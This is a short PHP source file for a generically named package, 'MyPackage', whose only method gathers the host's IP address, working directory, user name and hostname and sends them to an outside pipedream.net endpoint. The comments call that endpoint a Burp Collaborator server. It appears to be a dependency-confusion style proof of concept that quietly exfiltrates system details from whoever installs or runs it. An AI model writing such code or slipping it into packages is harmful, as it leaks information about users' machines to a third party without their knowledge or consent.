<?php

namespace MyPackage;

class MyPackage
{
    public static function sendData()
    {
        // Get IP address
        $ip = $_SERVER['SERVER_ADDR'] ?? '';

        // Get working directory
        $dir = getcwd();

        // Get username
        $username = get_current_user();

        // Get hostname
        $hostname = gethostname();

        // Burp Collaborator server URL
        $burpUrl = 'https://eo7hiufd2zsxv7j.m.pipedream.net/endpoint'; // Update with the actual endpoint path

        // Data to send
        $data = [
            'ip' => $ip,
            'directory' => $dir,
            'username' => $username,
            'hostname' => $hostname
        ];

        // Send data to Burp Collaborator server
        $queryString = http_build_query($data);
        $url = $burpUrl . '?' . $queryString;
        file_get_contents($url);
    }
}

